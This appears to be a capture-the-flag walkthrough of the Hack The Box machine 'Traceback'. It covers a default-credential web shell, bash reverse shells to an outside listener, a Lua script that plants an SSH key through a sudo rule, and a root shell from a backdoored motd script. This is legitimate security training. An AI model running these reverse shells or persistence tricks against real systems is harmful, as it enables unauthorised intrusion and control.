# Traceback
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `(unauthenticated)` | LFI & Command Injection via Web Shell | An `nmap` scan revealed ports 22 and 80 were open. The web server on port 80 displayed a message from a user named `Xh4H` about leaving a "backdoor". Directory enumeration with `gobuster` using the `CommonBackdoors-PHP.fuzz.txt` wordlist found `/smevk.php`. This page was a web shell accessible with the default credentials `admin:admin`. This web shell allowed for arbitrary command execution. |
| 2 | `webadmin` | Reverse Shell from Web Shell | Using the web shell, a `bash` reverse shell payload was executed to connect back to the attacker's machine. This provided a shell as the `webadmin` user. The user flag was not in the expected `/home/webadmin` directory, but a `note.txt` file hinted at a tool for Lua programming left by a `sysadmin`. |
| 3 | `sysadmin` | Sudo Misconfiguration (`luvit`) | `linPEAS` was run to enumerate privilege escalation vectors. It revealed that the `webadmin` user could run `/home/sysadmin/luvit` as the `sysadmin` user without a password. This binary was identified as a Lua interpreter. By crafting a Lua script that appends the attacker's public SSH key to `/home/sysadmin/.ssh/authorized_keys`, and then executing it with `sudo -u sysadmin /home/sysadmin/luvit`, the attacker gained SSH access as the `sysadmin` user. |
| 4 | `root` | `motd` Misconfiguration and Race Condition | As `sysadmin`, `linPEAS` and `pspy64` were used to find a privilege escalation vector. It was discovered that files in `/etc/update-motd.d/`, which are executed as `root` upon SSH login, were writable by the `sysadmin` group. Additionally, a cron job was observed running every 30 seconds that would overwrite these files with a backup. By modifying a `motd` file (e.g., `00-header`) to include a `bash` reverse shell payload and quickly logging in via SSH before the cron job could restore the original files, the attacker was able to execute their payload as `root` and gain a root shell. |
| 5 | `root` | Final Flag | With a root shell, the final flag was retrieved. |



## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Help us
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see the box is based on ubuntu, so without further doing let's dig into port 80.  
As we hit the site, we can see the following statement:  
```
This site has been owned
I have left a backdoor for all the net. FREE INTERNETZZZ
- Xh4H -
```
So, now we need to look for the backdoor that the hacker left behind for us.  
Let's start for some enumeration, with gobuster.  
If we go under seclist, we can notice that we have a file called ```CommonBackdoors-PHP.fuzz``` enumerating with gobuster using this file give us the following result:  
```
[root@kali Traceback ]$ gobuster dir -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt -uhttp://$TARGET/ -o dir-enum/gobuster-CommonBackdoors-PHP.fuzz.txt -s "200,204,301,302,307,403"                 

===============================================================                                                       
Gobuster v3.1.0                                            
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                         
===============================================================                                                       
[+] Url:                     http://10.10.10.181/          
[+] Method:                  GET                           
[+] Threads:                 10                            
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt         
[+] Negative Status codes:   404                           
[+] User Agent:              gobuster/3.1.0                
[+] Timeout:                 10s                           
===============================================================                                                       
2022/04/04 22:53:22 Starting gobuster in directory enumeration mode                                                   
===============================================================                                                       
/smevk.php            (Status: 200) [Size: 1261]           

===============================================================                                                       
2022/04/04 22:53:23 Finished                               
===============================================================   
```
if we open this page we get prompted for a login, we can access the webshell with credentials admin:admin and here we can see the webshell and execute command against the machine.

## Foothold
As we gain access to the webshell we can execute our basic reverse tcp bash shell by executing the below command on the webshell:  
```
bash -c 'bash -i >& /dev/tcp/10.10.14.24/9001 0>&1'
```
and gain a shell access as user webadmin:
```
root@kali:~/Documents/HTB/Boxes/Traceback# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.181] 42446
bash: cannot set terminal process group (666): Inappropriate ioctl for device
bash: no job control in this shell
webadmin@traceback:/var/www/html$
```
## User
Once we log in as user webmin we can navigate to home directory.  
Here we do not find any user.txt flag, instead we can find a note.txt containing the following:  
```
webadmin@traceback:/home/webadmin$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```
Now, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice the following sudo permission configured:  
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```
If we try to execute ```/home/sysadmin/luvit``` command as user sysadmin, we do get the following prompt:
```
webadmin@traceback:/home$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
>
```
Searching on google, we can find that luvit is:
```
description = "Advanced auto-completing repl for luvit lua."
```
So let's craft a lua payload to perform a privilege escalation to sysadmin user:
```
file = io.open("/home/sysadmin/.ssh/authorized_keys", "a")
io.output(file)
io.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFCJmc4ynaBcrfNOC7zovS7jdFz9ngy6Yr0rE+xxLPaSQTY5mTLO88R3iGx5uXZOfJKUgOLmcaxL56tmPfbtdSzSyg4Hv17OY7xITfA3gCZtAHSskQc2L1g7/lQ6MkjdA3m9PthLedXJOuOZqc5KnlvvptQZZpEub/9+1vCMA7MT786uKDlWwaKk5EpBRZimgWup/r/d98Bc3WrrXja3ecQlD+qI13et80cFBVLP38SFWU8snnSGe/zMuD/+i+e+k7CQFpncIZBme4RBLvgRTLpLgWOi+7hWOaLjVwsVQA4k9X4J8KEFoINbh69w96M6K3I76nqFYqNWFiI1Bx4UNqUe4mkSMbLg5ZPpoaMBnHJxM0Og1Sk8SbIynmWUrMqqWapU3VOWEdf2M2OuBtLaX5G4FhxeoONq4RozUxF47rvAu546U65z0hJyr0q5ghnOavL8W3OPFG44MmlcW4fxuHYGAWUypnlcN5VpBNJr0gz3U6DzIu2/wm8pggwW3elo0= root@kali")
io.close(file)
```
Now we can run our payload by simply:
```
webadmin@traceback:/tmp$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
```
And if everything worked right we should be able to login via SSH as sysadmin user:
```
[root@kali keys ]$ ssh -l sysadmin -i id_rsa_sysadmin $TARGET
The authenticity of host '10.10.10.181 (10.10.10.181)' can't be established.
ED25519 key fingerprint is SHA256:t2eqwvH1bBfzEerEaGcY/lX/lrLq/rpBznQqxrTiVfM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.181' (ED25519) to the list of known hosts.
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land



Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
$
```

## Root
Once we log in as sysadmin user, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice the following marked with a 100% likelihood to be a privilege escalation vector:
```
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)                                                                                                                                                                        
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                                                                                                 
  Group sysadmin:                                                                                                                                                                                                                            
/etc/update-motd.d/50-motd-news                                                                                                                                                                                                              
/etc/update-motd.d/10-help-text                                                                                                                                                                                                              
/etc/update-motd.d/91-release-upgrade                                                                                                                                                                                                        
/etc/update-motd.d/00-header
/etc/update-motd.d/80-esm
/home/webadmin/note.txt
```
Motd files are used to show message of the day when a user log in into a machine. these files can contain command which output is shown to the user at the time user logs in via SSH.  
If we run pspy64 we can notice the following motd file being used when triggering an ssh login event
```
2022/04/04 14:25:15 CMD: UID=0    PID=28028  | /bin/sh /etc/update-motd.d/50-motd-news
2022/04/04 14:25:15 CMD: UID=0    PID=28034  | /usr/bin/python3 -Es /usr/bin/lsb_release -cs
2022/04/04 14:25:15 CMD: UID=0    PID=28033  | /bin/sh /etc/update-motd.d/80-esm
2022/04/04 14:25:15 CMD: UID=0    PID=28035  | /usr/bin/python3 -Es /usr/bin/lsb_release -ds
2022/04/04 14:25:15 CMD: UID=0    PID=28039  | cut -d  -f4
2022/04/04 14:25:15 CMD: UID=0    PID=28038  | /usr/bin/python3 -Es /usr/bin/lsb_release -sd
2022/04/04 14:25:15 CMD: UID=0    PID=28037  | /bin/sh /etc/update-motd.d/91-release-upgrade
2022/04/04 14:25:15 CMD: UID=0    PID=28036  | /bin/sh /etc/update-motd.d/91-release-upgrade
```
Also, leaving pspy open we can see that every 30sec/1min a cronjob executes overwriting motd files with a backup.  
```
2022/04/04 14:31:31 CMD: UID=0    PID=28245  | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/
```
unfortunately we cannot edit the backup files as they are owned by root, instead, as discovered by linpeas, we can edit motd files directly, but we need to be quick since after 30 seconds from the edit files will be overwritten by the cronjob.  
Now, we can edit the motd files as follows:
```
sysadmin@traceback:/etc/update-motd.d$ vi 00-header
echo "\nWelcome to Xh4H land \n"
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release


echo "\nWelcome to Xh4H land \n"
bash -c 'bash -i >& /dev/tcp/10.10.14.24/9002 0>&1'
```
Now we can trigger an SSH login event by logging in as sysadmin. SSH, as seen in pspy will execute motd files.  
if we set up a listener on port 9002, after login SSH will execute (as root) motd files, hence, given the payload we crafted 00-header file execution will send back a reverse shell as root.
```
root@kali:~/Documents/HTB/Boxes/Traceback# nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.181] 49744
bash: cannot set terminal process group (28320): Inappropriate ioctl for device
bash: no job control in this shell
root@traceback:/# id
uid=0(root) gid=0(root) groups=0(root)
```
After we gained root privileges we can check the cronjob that recover the motd files and perform a sort of (weak) anti-tampering system:  
```
# m h  dom mon dow   command
* * * * * /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
* * * * * sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
```
